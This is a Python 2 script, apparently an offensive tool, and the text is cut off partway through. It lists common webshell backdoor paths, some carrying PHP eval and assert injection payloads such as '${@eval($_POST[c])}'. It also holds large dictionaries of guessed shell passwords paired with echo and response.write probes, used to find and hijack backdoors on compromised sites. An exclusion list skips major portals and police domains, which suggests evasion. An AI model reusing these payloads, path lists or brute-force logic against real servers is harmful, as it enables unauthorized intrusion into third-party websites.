# -*- coding: utf-8 -*-
# mode by yc,saohai,lang

import json
import re
import datetime
import urllib2

import time
import requests
import smtplib
import email.mime.multipart
from email.mime.text import MIMEText
import email.mime.text
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import os
import sys
from Tkinter import *

reload(sys)
sys.setdefaultencoding('utf8')

all_traces=[
'/plus/laobiao.php','/data/data.asp','/one.php','/login_all.php?login=cmd','/expsky.php','/SqlIn.asp','/SqlOut.asp','/data/%23data.asp','/config/AspCms_Config.asp','/inc/config.asp','/data/data.asp','/css.asp','/config/AspCms_Config.asp','/inc/config.asp','/9tu.asp','/11m.asp','/admin/index.asp','/conn1.asp','/concon.asp','/index.asp','/UploadFile/index.asp','/bsm.asp','/inc/config.asp','/admin/Databackup/1.asp','/images/img.asp','/inc/myql.asp','/a.asp','/Images/cache.asp','/css/css.asp','/inc/config.asp','/jiuge.asp','/1.asp','/ver.asp','/Templates/red.asp','/plus/laobiao.php','/plus/90sec.php','/utility/convert/data/config.inc.php','/admin.php/module/action/param1/${@eval($_POST[c])}','/test.php','/login_wall.php?login=cmd','/5t/css/mp.php','/i.php','/data/404test.php','/plus/mytag_js.php?aid=9090','/11m.php','/1.php','/plus/90sec.php/plus/90sec.php','/plus/mytag_js.php?aid=511348','/languages/zh_cn/convert/shopex49.php?license_id=assert','/index.php/Index/index/name/${@eval($_POST[c])}','/data/config_data.php','/2016/gou.php','/api/newfile.php?','/cache/cachee.php','/plus/ad_js.php?aid=9090','/plus/mytag_js.php?aid=9527','/index.php','/index.php?s=/module/action/param1/$%7B@print(eval($_POST[c]))%7D','/plus/mytag_js.php?aid=8080','/fuck.php','/sqzr.php','/index.php?m=formguide&c=index&a=show&formid=1&siteid=1','/yp/product.php?pagesize=${${@eval%28$_POST[-62]%29}}','/About/newfile.php','/include/data/words/words.php','/plus/mytag_js.php?aid=6022','/plus/mytag_js.php?aid=9191','/login.php?login=cmd','/1.php','/bbs/utility/convert/data/config.inc.php','/uploads/newfile.php','/test.php','/news/2016/gou.php','/images/swfupload/images/uploadye.php','/plus/Reg.aspx','/data/Reg.aspx','/5t/css/Reg.aspx','/5t/data/Reg.aspx','/5t/images/Reg.aspx','/5t/fhd/Reg.aspx','/images/Reg.aspx','/date/js/v5/v5she.aSpX','/fdh/Reg.aspx','/_Temp/com.aspx','/css/Reg.aspx','/admin/images/style.aspx','/x.aspx','/sd6/bc/jty.aSpX','/sd6/wr5/jty.aSpX','/5t/css/Reg.aspx','/is/test.jsp','/is.test.jsp','/vaf/vaf.jsp','/1111.jsp','/a.jsp','/11111.jsp','/bak.jsp'
]

getout = ['.douban.','!','@','#','$','%','^','&','*','(',')','+','-','=','<','>',',','[',']','{','}','.police.','.360.','.so.','.360doc.','.ifeng.','.xywy.','.51.','.cnzz.','.chinaz.','.taobao.','.etao.','.youku.','.renren.','.tudou.','.sohu.','.zhihu.','.58pic.','.17yy.','.dududm.','.kan300.','.2345.','.eastmoney.','.jd.','.ganji.','.job.','.chinahr.','.b2b.','.1024sj.','.hc360.','.qq.','.sina.','.39.','.pclady.','.1688.','.bing.','.yahoo.cn','.youdao.','.dianping.','.qunar.','.amazon.','.fang.','.mafengwo.','.58.','.baike.','.zhaopin.','.iqiyi.','.51job.','.window.','.google.','.sogou.','.soso.','.baidu.','.windows.','.w3.','.miitbeian.','.beianbeian.','.beian.','.163.','.126.','.google.','police']

data_php={'one':'echo "z+=";','expsky':'echo "z+=";','ysh':'echo "z+=";','lan':'echo "z+=";','tuhao':'echo "z+=";','aba':'echo "z+=";','xise':'echo "z+=";','rmb2014':'echo "z+=";','shiban':'echo "z+=";','check_license':'echo "z+=";','mowang':'echo "z+=";','vales':'echo "z+=";','sqzr':'echo "z+=";','-62':'echo "z+=";','nimabi123':'echo "z+=";','laobiao':'echo "z+=";','tuhao':'','aa':'echo "z+=";','coco':'echo "z+=";','diaosi':'echo "z+=";','!@#123':'echo "z+=";','a':'echo "z+=";','1':'echo "z+=";','#':'echo "z+=";','l':'echo "z+=";','cmd':'echo "z+=";','diy':'echo "z+=";','cnnsc':'echo "z+=";','value':'echo "z+=";','system':'echo "z+=";','sys':'echo "z+=";','hack':'echo "z+=";','hack88':'echo "z+=";','hacker':'echo "z+=";','fuck':'echo "z+=";','shit':'echo "z+=";','pass':'echo "z+=";','guji':'echo "z+=";','gufeng':'echo "z+=";','password':'echo "z+=";','pwd':'echo "z+=";','passwd':'echo "z+=";','pswd':'echo "z+=";','mima':'echo "z+=";','mm':'echo "z+=";','go':'echo "z+=";','do':'echo "z+=";','ok':'echo "z+=";','test':'echo "z+=";','hansoncn':'echo "z+=";','shadow':'echo "z+=";','ah':'echo "z+=";','ala520':'echo "z+=";','zanghua':'echo "z+=";','jimkk1':'echo "z+=";','pa':'echo "z+=";','fk':'echo "z+=";','wenzi':'echo "z+=";','xiao':'echo "z+=";','xiaolu':'echo "z+=";','key':'echo "z+=";','lv':'echo "z+=";','shell':'echo "z+=";','sh':'echo "z+=";','dirshell':'echo "z+=";','sysshell':'echo "z+=";','no':'echo "z+=";','loveu':'echo "z+=";','love':'echo "z+=";','wrsky':'echo "z+=";','zz':'echo "z+=";','3321':'echo "z+=";','12345':'echo "z+=";','123456':'echo "z+=";','123':'echo "z+=";','109':'echo "z+=";','aoyunwan':'echo "z+=";','textarea1':'echo "z+=";','wxy':'echo "z+=";','zjg':'echo "z+=";','b':'echo "z+=";','c':'echo "z+=";','d':'echo "z+=";','e':'echo "z+=";','f':'echo "z+=";','g':'echo "z+=";','h':'echo "z+=";','i':'echo "z+=";','j':'echo "z+=";','k':'echo "z+=";','m':'echo "z+=";','n':'echo "z+=";','o':'echo "z+=";','p':'echo "z+=";','q':'echo "z+=";','r':'echo "z+=";','s':'echo "z+=";','t':'echo "z+=";','u':'echo "z+=";','v':'echo "z+=";','w':'echo "z+=";','x':'echo "z+=";','y':'echo "z+=";','z':'echo "z+=";','2':'echo "z+=";','3':'echo "z+=";','4':'echo "z+=";','5':'echo "z+=";','6':'echo "z+=";','7':'echo "z+=";','8':'echo "z+=";','9':'echo "z+=";','0':'echo "z+=";','':'echo "z+=";','':'echo "z+=";','584521':'echo "z+=";','nohack':'echo "z+=";','45189946':'echo "z+=";','hacksb':'echo "z+=";','hackersb':'echo "z+=";','heixiaozi':'echo "z+=";','360':'echo "z+=";','sb360':'echo "z+=";','yushiwuzheng':'echo "z+=";','spider':'echo "z+=";','angel':'echo "z+=";','4ngel':'echo "z+=";','yyswxws':'echo "z+=";','lcx':'echo "z+=";','8238838':'echo "z+=";','456655':'echo "z+=";','test1':'echo "z+=";','test2':'echo "z+=";','test3':'echo "z+=";','test5':'echo "z+=";','Administrator':'echo "z+=";','system':'echo "z+=";','fuck':'echo "z+=";','fuckyou':'echo "z+=";','admin':'echo "z+=";','MASTER':'echo "z+=";','master':'echo "z+=";','root':'echo "z+=";','super':'echo "z+=";','administrator':'echo "z+=";','h4ck':'echo "z+=";','h4ck3r':'echo "z+=";','7788414':'echo "z+=";','******':'echo "z+=";','********':'echo "z+=";','love':'echo "z+=";','loveu':'echo "z+=";','forgot':'echo "z+=";','space':'echo "z+=";','20080808':'echo "z+=";','666666':'echo "z+=";','888888':'echo "z+=";','%null%':'echo "z+=";','%username%':'echo "z+=";','123456':'echo "z+=";','12345678':'echo "z+=";','123456789':'echo "z+=";','111111':'echo "z+=";','11111111':'echo "z+=";','000':'echo "z+=";','000000':'echo "z+=";','88888888':'echo "z+=";','123123':'echo "z+=";','5201314':'echo "z+=";','1234567890':'echo "z+=";','aaaaaa':'echo "z+=";','654321':'echo "z+=";','999999':'echo "z+=";','123321':'echo "z+=";','222222':'echo "z+=";','7758521':'echo "z+=";','iloveyou':'echo "z+=";','password':'echo "z+=";','121212':'echo "z+=";','qazwsx':'echo "z+=";','112233':'echo "z+=";','1314520':'echo "z+=";','11223344':'echo "z+=";','333333':'echo "z+=";','987654321':'echo "z+=";','888999':'echo "z+=";','0123456789':'echo "z+=";','zxcvbnm':'echo "z+=";','windows':'echo "z+=";','789456':'echo "z+=";','999999999':'echo "z+=";','22222222':'echo "z+=";','7777777':'echo "z+=";','7758258':'echo "z+=";','520520':'echo "z+=";','168168':'echo "z+=";','wwwwww':'echo "z+=";','555555':'echo "z+=";','asdfgh':'echo "z+=";','147258':'echo "z+=";','qwerty':'echo "z+=";','1qaz2wsx':'echo "z+=";','12344321':'echo "z+=";','xxxxxx':'echo "z+=";','960628':'echo "z+=";','55555555':'echo "z+=";','111222':'echo "z+=";','asdfghjkl':'echo "z+=";','abc123':'echo "z+=";','31415926':'echo "z+=";','ffffff':'echo "z+=";','zzzzzz':'echo "z+=";','abcd1234':'echo "z+=";','12121212':'echo "z+=";','haha':'echo "z+=";','hahaha':'echo "z+=";','101010':'echo "z+=";','!@#$':'echo "z+=";','!@#$%':'echo "z+=";','!@#$%^':'echo "z+=";','!@#$%^&':'echo "z+=";','!@#$%^&*':'echo "z+=";','%username%!@#$':'echo "z+=";','tkfkdgo':'echo "z+=";','1004':'echo "z+=";','2580':'echo "z+=";','asd123':'echo "z+=";','1q2w3e':'echo "z+=";','shinhwa':'echo "z+=";','tlsghk':'echo "z+=";','909':'echo "z+=";','apt1306':'echo "z+=";','326':'echo "z+=";','bb7234':'echo "z+=";','201977':'echo "z+=";','dkssud':'echo "z+=";','qlalf':'echo "z+=";','diddnjs76':'echo "z+=";','1024':'echo "z+=";','1228':'echo "z+=";','10040907':'echo "z+=";','1114':'echo "z+=";','1123':'echo "z+=";','780314':'echo "z+=";','70':'echo "z+=";','292513':'echo "z+=";','1030':'echo "z+=";','7981':'echo "z+=";','sksmssk':'echo "z+=";','Wkwmdsk':'echo "z+=";','wjstjf':'echo "z+=";','2000':'echo "z+=";','DHFPSWL':'echo "z+=";','1113':'echo "z+=";','918':'echo "z+=";','7979':'echo "z+=";','rkskekfk':'echo "z+=";','1318':'echo "z+=";','sotkfkd':'echo "z+=";','7942':'echo "z+=";','821':'echo "z+=";','1225':'echo "z+=";','wjswlgus':'echo "z+=";','5tmdgks':'echo "z+=";','134679':'echo "z+=";','cjttkfkd':'echo "z+=";','qkqhek':'echo "z+=";','159357':'echo "z+=";','1313':'echo "z+=";','djajsl':'echo "z+=";','1895':'echo "z+=";','1127':'echo "z+=";','1226':'echo "z+=";','780607':'echo "z+=";','qkqhdi':'echo "z+=";','815':'echo "z+=";','2357':'echo "z+=";','gg8008':'echo "z+=";','1229':'echo "z+=";','1042':'echo "z+=";','730':'echo "z+=";','7418':'echo "z+=";','apfhd':'echo "z+=";','1818':'echo "z+=";','qudtls':'echo "z+=";','dkagh':'echo "z+=";','960907':'echo "z+=";','5082':'echo "z+=";','9484erp':'echo "z+=";','aldksgo':'echo "z+=";','3578':'echo "z+=";','1928':'echo "z+=";','ss0808':'echo "z+=";','5567103':'echo "z+=";','90718':'echo "z+=";','forever':'echo "z+=";','204906':'echo "z+=";','3256':'echo "z+=";','q1w2e3':'echo "z+=";','zaq123':'echo "z+=";','sh0324':'echo "z+=";','rhdwnsla':'echo "z+=";','625':'echo "z+=";','skskfdl':'echo "z+=";','1204':'echo "z+=";','1730':'echo "z+=";','s93470970':'echo "z+=";','2848048':'echo "z+=";','gksrmf97':'echo "z+=";','1092':'echo "z+=";','4fkdgo':'echo "z+=";','kjs4020':'echo "z+=";','48010':'echo "z+=";','a1b2c3':'echo "z+=";','hiphop':'echo "z+=";','aeotjd13':'echo "z+=";','pys5936':'echo "z+=";','a8851642':'echo "z+=";','tkfkdgod':'echo "z+=";','7896':'echo "z+=";','a7734':'echo "z+=";','123qwe':'echo "z+=";','305':'echo "z+=";','todrkr':'echo "z+=";','hs7771':'echo "z+=";','1969':'echo "z+=";','1118':'echo "z+=";','a12345':'echo "z+=";','78451296':'echo "z+=";','1012':'echo "z+=";','6420383':'echo "z+=";','7960':'echo "z+=";','dnflwlq':'echo "z+=";','93493400':'echo "z+=";','981011':'echo "z+=";','ajdcjddl':'echo "z+=";','sh5531':'echo "z+=";','9604':'echo "z+=";','wlgml84':'echo "z+=";','akdntm2':'echo "z+=";','kim1968':'echo "z+=";','eric2456':'echo "z+=";','102030':'echo "z+=";','rlarkdfks':'echo "z+=";','dkfktl':'echo "z+=";','ha2426':'echo "z+=";','902':'echo "z+=";','1126611':'echo "z+=";','tjdgml':'echo "z+=";','ks1220':'echo "z+=";','8522554':'echo "z+=";','1357':'echo "z+=";','rhaehfdl':'echo "z+=";','hoi486':'echo "z+=";','vnflsl':'echo "z+=";','704':'echo "z+=";','132435':'echo "z+=";','1880':'echo "z+=";','wjddms':'echo "z+=";','1264ce':'echo "z+=";','73217':'echo "z+=";','tkfkdgody':'echo "z+=";','4885':'echo "z+=";','hbjn3165':'echo "z+=";','hee1026':'echo "z+=";','4266':'echo "z+=";','38317':'echo "z+=";','seo123to':'echo "z+=";','as1234':'echo "z+=";','godqhr':'echo "z+=";','741963':'echo "z+=";','tkfdkdgo':'echo "z+=";','gmlwns':'echo "z+=";','124':'echo "z+=";','f123456':'echo "z+=";','love1052':'echo "z+=";','794613':'echo "z+=";','alclssja':'echo "z+=";','gksksla':'echo "z+=";','890214':'echo "z+=";','zhfldk':'echo "z+=";','rlwkr1':'echo "z+=";','1994':'echo "z+=";','12354568':'echo "z+=";','vldksh':'echo "z+=";','gusrud':'echo "z+=";','foro12':'echo "z+=";','nc':'echo "z+=";','hackqingshu':'echo "z+=";','qingshu$':'echo "z+=";','sz':'echo "z+=";','sunzi':'echo "z+=";','shunzi':'echo "z+=";','123!@#':'echo "z+=";','123654':'echo "z+=";','123654789':'echo "z+=";','123654789!':'echo "z+=";','123654789.':'echo "z+=";','aspadmin':'echo "z+=";','phpadmin':'echo "z+=";','jspadmin':'echo "z+=";','aspxadmin':'echo "z+=";','noadmin':'echo "z+=";','cms':'echo "z+=";','iamnotadmin':'echo "z+=";','fuckit':'echo "z+=";','fuckhack':'echo "z+=";','fuckhacker':'echo "z+=";','F19ht':'echo "z+=";','f19ht':'echo "z+=";','fight':'echo "z+=";','hkmjj':'echo "z+=";','chinared':'echo "z+=";','ouou':'echo "z+=";','hake':'echo "z+=";','hakecc':'echo "z+=";','wwwhakecc':'echo "z+=";','520hack':'echo "z+=";','hack520':'echo "z+=";','r4sky':'echo "z+=";','ghost':'echo "z+=";','baidu':'echo "z+=";','daoqq':'echo "z+=";','daohao':'echo "z+=";','youaresb':'echo "z+=";','caonimadebi':'echo "z+=";','worinima':'echo "z+=";','wocaonima':'echo "z+=";','caonimei':'echo "z+=";','lunnijie':'echo "z+=";','whatweb':'echo "z+=";','baidusb':'echo "z+=";','baiduadmin':'echo "z+=";','chenxue':'echo "z+=";','cnot':'echo "z+=";','xxoxx':'echo "z+=";','hkk007':'echo "z+=";','chengnuo':'echo "z+=";','wrsk':'echo "z+=";','wrsky':'echo "z+=";','yuemo':'echo "z+=";','4lert':'echo "z+=";','maek ':'echo "z+=";','dreamh':'echo "z+=";','Shell':'echo "z+=";','shell':'echo "z+=";','10011C120105101':'echo "z+=";','fclshark':'echo "z+=";','19880118':'echo "z+=";','376186027':'echo "z+=";','535039':'echo "z+=";','darkst':'echo "z+=";','jcksyes':'echo "z+=";','jinjin':'echo "z+=";','sq19880602':'echo "z+=";','jtk2352':'echo "z+=";','kill':'echo "z+=";','haode':'echo "z+=";','chuang':'echo "z+=";','aiezu':'echo "z+=";','981246':'echo "z+=";','et520':'echo "z+=";','lx':'echo "z+=";','lengxue':'echo "z+=";','aoyunhui':'echo "z+=";','fucker':'echo "z+=";','tiger':'echo "z+=";','tag':'echo "z+=";','iloveshell':'echo "z+=";','yrpx':'echo "z+=";','air':'echo "z+=";','ceshi2009':'echo "z+=";','kissy':'echo "z+=";','3452510':'echo "z+=";','rfkl':'echo "z+=";','847381979':'echo "z+=";','jing':'echo "z+=";','winner':'echo "z+=";','4816535':'echo "z+=";','shaomo':'echo "z+=";','zhack':'echo "z+=";','mama':'echo "z+=";','mama520':'echo "z+=";','Fuckyou':'echo "z+=";','FuckYou':'echo "z+=";','lengfeng':'echo "z+=";','lengfengsk':'echo "z+=";','rensheng':'echo "z+=";','123go':'echo "z+=";','xiaowu':'echo "z+=";','Baike':'echo "z+=";','admin888':'echo "z+=";','honker':'echo "z+=";','hongker':'echo "z+=";','liner':'echo "z+=";','xiaoyi':'echo "z+=";','xiaoe':'echo "z+=";','login':'echo "z+=";','Evav':'echo "z+=";','13572468':'echo "z+=";','Sa':'echo "z+=";','sa':'echo "z+=";','sasa':'echo "z+=";','dangdang':'echo "z+=";','webshell':'echo "z+=";','lovehack7758':'echo "z+=";','hkmm':'echo "z+=";','133135136':'echo "z+=";','80sec':'echo "z+=";','G.xp':'echo "z+=";','gxp':'echo "z+=";','1992724':'echo "z+=";','satan':'echo "z+=";','Satan':'echo "z+=";','yong':'echo "z+=";','fst':'echo "z+=";','f.s.t':'echo "z+=";','F.S.T':'echo "z+=";','noid':'echo "z+=";','sadness':'echo "z+=";','caodan':'echo "z+=";','96315001':'echo "z+=";','axiao ':'echo "z+=";','847381979 ':'echo "z+=";','bzxyd ':'echo "z+=";','tonecan ':'echo "z+=";','5201314 ':'echo "z+=";','3est ':'echo "z+=";','sin ':'echo "z+=";','654321 ':'echo "z+=";','ghost ':'echo "z+=";','evil':'echo "z+=";','evilhk':'echo "z+=";','evilhack':'echo "z+=";','evilhacker':'echo "z+=";','ying':'echo "z+=";','webadmin':'echo "z+=";','webadmin2':'echo "z+=";','HqzX':'echo "z+=";','tengxin':'echo "z+=";','tengxunsb':'echo "z+=";','danteng':'echo "z+=";','rusuan':'echo "z+=";','dantong':'echo "z+=";','youguest':'echo "z+=";','cmdshell':'echo "z+=";','Webshell':'echo "z+=";','WebShell':'echo "z+=";','sh3ll':'echo "z+=";','ufohack':'echo "z+=";','jiaozu':'echo "z+=";','huaidan':'echo "z+=";','jiaozhu':'echo "z+=";','lover':'echo "z+=";','daoker':'echo "z+=";','daokers':'echo "z+=";','guige':'echo "z+=";','55103839':'echo "z+=";','551416':'echo "z+=";','2018':'echo "z+=";','2017':'echo "z+=";','2015':'echo "z+=";','2014':'echo "z+=";','2012':'echo "z+=";','QQ':'echo "z+=";','diaosi':'echo "z+=";','tcb':'echo "z+=";','ttc':'echo "z+=";','T00ls':'echo "z+=";'}
data_asp={'ysh':'response.write("z+=")','lan':'response.write("z+=")','tuhao':'response.write("z+=")','aba':'response.write("z+=")','xise':'response.write("z+=")','rmb2014':'response.write("z+=")','shiban':'response.write("z+=")','check_license':'response.write("z+=")','mowang':'response.write("z+=")','vales':'response.write("z+=")','sqzr':'response.write("z+=")','-62':'response.write("z+=")','nimabi123':'response.write("z+=")','laobiao':'response.write("z+=")','aa':'response.write("z+=")','coco':'response.write("z+=")','diaosi':'response.write("z+=")','!@#123':'response.write("z+=")','a':'response.write("z+=")','1':'response.write("z+=")','#':'response.write("z+=")','l':'response.write("z+=")','cmd':'response.write("z+=")','diy':'response.write("z+=")','cnnsc':'response.write("z+=")','value':'response.write("z+=")','system':'response.write("z+=")','sys':'response.write("z+=")','hack':'response.write("z+=")','hack88':'response.write("z+=")','hacker':'response.write("z+=")','fuck':'response.write("z+=")','shit':'response.write("z+=")','pass':'response.write("z+=")','guji':'response.write("z+=")','gufeng':'response.write("z+=")','password':'response.write("z+=")','pwd':'response.write("z+=")','passwd':'response.write("z+=")','pswd':'response.write("z+=")','mima':'response.write("z+=")','mm':'response.write("z+=")','go':'response.write("z+=")','do':'response.write("z+=")','ok':'response.write("z+=")','test':'response.write("z+=")','hansoncn':'response.write("z+=")','shadow':'response.write("z+=")','ah':'response.write("z+=")','ala520':'response.write("z+=")','zanghua':'response.write("z+=")','jimkk1':'response.write("z+=")','pa':'response.write("z+=")','fk':'response.write("z+=")','wenzi':'response.write("z+=")','xiao':'response.write("z+=")','xiaolu':'response.write("z+=")','key':'response.write("z+=")','lv':'response.write("z+=")','shell':'response.write("z+=")','sh':'response.write("z+=")','dirshell':'response.write("z+=")','sysshell':'response.write("z+=")','no':'response.write("z+=")','loveu':'response.write("z+=")','love':'response.write("z+=")','wrsky':'response.write("z+=")','zz':'response.write("z+=")','3321':'response.write("z+=")','12345':'response.write("z+=")','123456':'response.write("z+=")','123':'response.write("z+=")','109':'response.write("z+=")','aoyunwan':'response.write("z+=")','textarea1':'response.write("z+=")','wxy':'response.write("z+=")','zjg':'response.write("z+=")','b':'response.write("z+=")','c':'response.write("z+=")','d':'response.write("z+=")','e':'response.write("z+=")','f':'response.write("z+=")','g':'response.write("z+=")','h':'response.write("z+=")','i':'response.write("z+=")','j':'response.write("z+=")','k':'response.write("z+=")','m':'response.write("z+=")','n':'response.write("z+=")','o':'response.write("z+=")','p':'response.write("z+=")','q':'response.write("z+=")','r':'response.write("z+=")','s':'response.write("z+=")','t':'response.write("z+=")','u':'response.write("z+=")','v':'response.write("z+=")','w':'response.write("z+=")','x':'response.write("z+=")','y':'response.write("z+=")','z':'response.write("z+=")','2':'response.write("z+=")','3':'response.write("z+=")','4':'response.write("z+=")','5':'response.write("z+=")','6':'response.write("z+=")','7':'response.write("z+=")','8':'response.write("z+=")','9':'response.write("z+=")','0':'response.write("z+=")','':'response.write("z+=")','':'response.write("z+=")','584521':'response.write("z+=")','nohack':'response.write("z+=")','45189946':'response.write("z+=")','hacksb':'response.write("z+=")','hackersb':'response.write("z+=")','heixiaozi':'response.write("z+=")','360':'response.write("z+=")','sb360':'response.write("z+=")','yushiwuzheng':'response.write("z+=")','spider':'response.write("z+=")','angel':'response.write("z+=")','4ngel':'response.write("z+=")','yyswxws':'response.write("z+=")','lcx':'response.write("z+=")','8238838':'response.write("z+=")','456655':'response.write("z+=")','test1':'response.write("z+=")','test2':'response.write("z+=")','test3':'response.write("z+=")','test5':'response.write("z+=")','Administrator':'response.write("z+=")','system':'response.write("z+=")','fuck':'response.write("z+=")','fuckyou':'response.write("z+=")','admin':'response.write("z+=")','MASTER':'response.write("z+=")','master':'response.write("z+=")','root':'response.write("z+=")','super':'response.write("z+=")','administrator':'response.write("z+=")','h4ck':'response.write("z+=")','h4ck3r':'response.write("z+=")','7788414':'response.write("z+=")','******':'response.write("z+=")','********':'response.write("z+=")','love':'response.write("z+=")','loveu':'response.write("z+=")','forgot':'response.write("z+=")','space':'response.write("z+=")','20080808':'response.write("z+=")','666666':'response.write("z+=")','888888':'response.write("z+=")','%null%':'response.write("z+=")','%username%':'response.write("z+=")','123456':'response.write("z+=")','12345678':'response.write("z+=")','123456789':'response.write("z+=")','111111':'response.write("z+=")','11111111':'response.write("z+=")','000':'response.write("z+=")','000000':'response.write("z+=")','88888888':'response.write("z+=")','123123':'response.write("z+=")','5201314':'response.write("z+=")','1234567890':'response.write("z+=")','aaaaaa':'response.write("z+=")','654321':'response.write("z+=")','999999':'response.write("z+=")','123321':'response.write("z+=")','222222':'response.write("z+=")','7758521':'response.write("z+=")','iloveyou':'response.write("z+=")','password':'response.write("z+=")','121212':'response.write("z+=")','qazwsx':'response.write("z+=")','112233':'response.write("z+=")','1314520':'response.write("z+=")','11223344':'response.write("z+=")','333333':'response.write("z+=")','987654321':'response.write("z+=")','888999':'response.write("z+=")','0123456789':'response.write("z+=")','zxcvbnm':'response.write("z+=")','windows':'response.write("z+=")','789456':'response.write("z+=")','999999999':'response.write("z+=")','22222222':'response.write("z+=")','7777777':'response.write("z+=")','7758258':'response.write("z+=")','520520':'response.write("z+=")','168168':'response.write("z+=")','wwwwww':'response.write("z+=")','555555':'response.write("z+=")','asdfgh':'response.write("z+=")','147258':'response.write("z+=")','qwerty':'response.write("z+=")','1qaz2wsx':'response.write("z+=")','12344321':'response.write("z+=")','xxxxxx':'response.write("z+=")','960628':'response.write("z+=")','55555555':'response.write("z+=")','111222':'response.write("z+=")','asdfghjkl':'response.write("z+=")','abc123':'response.write("z+=")','31415926':'response.write("z+=")','ffffff':'response.write("z+=")','zzzzzz':'response.write("z+=")','abcd1234':'response.write("z+=")','12121212':'response.write("z+=")','haha':'response.write("z+=")','hahaha':'response.write("z+=")','101010':'response.write("z+=")','!@#$':'response.write("z+=")','!@#$%':'response.write("z+=")','!@#$%^':'response.write("z+=")','!@#$%^&':'response.write("z+=")','!@#$%^&*':'response.write("z+=")','%username%!@#$':'response.write("z+=")','tkfkdgo':'response.write("z+=")','1004':'response.write("z+=")','2580':'response.write("z+=")','asd123':'response.write("z+=")','1q2w3e':'response.write("z+=")','shinhwa':'response.write("z+=")','tlsghk':'response.write("z+=")','909':'response.write("z+=")','apt1306':'response.write("z+=")','326':'response.write("z+=")','bb7234':'response.write("z+=")','201977':'response.write("z+=")','dkssud':'response.write("z+=")','qlalf':'response.write("z+=")','diddnjs76':'response.write("z+=")','1024':'response.write("z+=")','1228':'response.write("z+=")','10040907':'response.write("z+=")','1114':'response.write("z+=")','1123':'response.write("z+=")','780314':'response.write("z+=")','70':'response.write("z+=")','292513':'response.write("z+=")','1030':'response.write("z+=")','7981':'response.write("z+=")','sksmssk':'response.write("z+=")','Wkwmdsk':'response.write("z+=")','wjstjf':'response.write("z+=")','2000':'response.write("z+=")','DHFPSWL':'response.write("z+=")','1113':'response.write("z+=")','918':'response.write("z+=")','7979':'response.write("z+=")','rkskekfk':'response.write("z+=")','1318':'response.write("z+=")','sotkfkd':'response.write("z+=")','7942':'response.write("z+=")','821':'response.write("z+=")','1225':'response.write("z+=")','wjswlgus':'response.write("z+=")','5tmdgks':'response.write("z+=")','134679':'response.write("z+=")','cjttkfkd':'response.write("z+=")','qkqhek':'response.write("z+=")','159357':'response.write("z+=")','1313':'response.write("z+=")','djajsl':'response.write("z+=")','1895':'response.write("z+=")','1127':'response.write("z+=")','1226':'response.write("z+=")','780607':'response.write("z+=")','qkqhdi':'response.write("z+=")','815':'response.write("z+=")','2357':'response.write("z+=")','gg8008':'response.write("z+=")','1229':'response.write("z+=")','1042':'response.write("z+=")','730':'response.write("z+=")','7418':'response.write("z+=")','apfhd':'response.write("z+=")','1818':'response.write("z+=")','qudtls':'response.write("z+=")','dkagh':'response.write("z+=")','960907':'response.write("z+=")','5082':'response.write("z+=")','9484erp':'response.write("z+=")','aldksgo':'response.write("z+=")','3578':'response.write("z+=")','1928':'response.write("z+=")','ss0808':'response.write("z+=")','5567103':'response.write("z+=")','90718':'response.write("z+=")','forever':'response.write("z+=")','204906':'response.write("z+=")','3256':'response.write("z+=")','q1w2e3':'response.write("z+=")','zaq123':'response.write("z+=")','sh0324':'response.write("z+=")','rhdwnsla':'response.write("z+=")','625':'response.write("z+=")','skskfdl':'response.write("z+=")','1204':'response.write("z+=")','1730':'response.write("z+=")','s93470970':'response.write("z+=")','2848048':'response.write("z+=")','gksrmf97':'response.write("z+=")','1092':'response.write("z+=")','4fkdgo':'response.write("z+=")','kjs4020':'response.write("z+=")','48010':'response.write("z+=")','a1b2c3':'response.write("z+=")','hiphop':'response.write("z+=")','aeotjd13':'response.write("z+=")','pys5936':'response.write("z+=")','a8851642':'response.write("z+=")','tkfkdgod':'response.write("z+=")','7896':'response.write("z+=")','a7734':'response.write("z+=")','123qwe':'response.write("z+=")','305':'response.write("z+=")','todrkr':'response.write("z+=")','hs7771':'response.write("z+=")','1969':'response.write("z+=")','1118':'response.write("z+=")','a12345':'response.write("z+=")','78451296':'response.write("z+=")','1012':'response.write("z+=")','6420383':'response.write("z+=")','7960':'response.write("z+=")','dnflwlq':'response.write("z+=")','93493400':'response.write("z+=")','981011':'response.write("z+=")','ajdcjddl':'response.write("z+=")','sh5531':'response.write("z+=")','9604':'response.write("z+=")','wlgml84':'response.write("z+=")','akdntm2':'response.write("z+=")','kim1968':'response.write("z+=")','eric2456':'response.write("z+=")','102030':'response.write("z+=")','rlarkdfks':'response.write("z+=")','dkfktl':'response.write("z+=")','ha2426':'response.write("z+=")','902':'response.write("z+=")','1126611':'response.write("z+=")','tjdgml':'response.write("z+=")','ks1220':'response.write("z+=")','8522554':'response.write("z+=")','1357':'response.write("z+=")','rhaehfdl':'response.write("z+=")','hoi486':'response.write("z+=")','vnflsl':'response.write("z+=")','704':'response.write("z+=")','132435':'response.write("z+=")','1880':'response.write("z+=")','wjddms':'response.write("z+=")','1264ce':'response.write("z+=")','73217':'response.write("z+=")','tkfkdgody':'response.write("z+=")','4885':'response.write("z+=")','hbjn3165':'response.write("z+=")','hee1026':'response.write("z+=")','4266':'response.write("z+=")','38317':'response.write("z+=")','seo123to':'response.write("z+=")','as1234':'response.write("z+=")','godqhr':'response.write("z+=")','741963':'response.write("z+=")','tkfdkdgo':'response.write("z+=")','gmlwns':'response.write("z+=")','124':'response.write("z+=")','f123456':'response.write("z+=")','love1052':'response.write("z+=")','794613':'response.write("z+=")','alclssja':'response.write("z+=")','gksksla':'response.write("z+=")','890214':'response.write("z+=")','zhfldk':'response.write("z+=")','rlwkr1':'response.write("z+=")','1994':'response.write("z+=")','12354568':'response.write("z+=")','vldksh':'response.write("z+=")','gusrud':'response.write("z+=")','foro12':'response.write("z+=")','nc':'response.write("z+=")','hackqingshu':'response.write("z+=")','qingshu$':'response.write("z+=")','sz':'response.write("z+=")','sunzi':'response.write("z+=")','shunzi':'response.write("z+=")','123!@#':'response.write("z+=")','123654':'response.write("z+=")','123654789':'response.write("z+=")','123654789!':'response.write("z+=")','123654789.':'response.write("z+=")','aspadmin':'response.write("z+=")','phpadmin':'response.write("z+=")','jspadmin':'response.write("z+=")','aspxadmin':'response.write("z+=")','noadmin':'response.write("z+=")','cms':'response.write("z+=")','iamnotadmin':'response.write("z+=")','fuckit':'response.write("z+=")','fuckhack':'response.write("z+=")','fuckhacker':'response.write("z+=")','F19ht':'response.write("z+=")','f19ht':'response.write("z+=")','fight':'response.write("z+=")','hkmjj':'response.write("z+=")','chinared':'response.write("z+=")','ouou':'re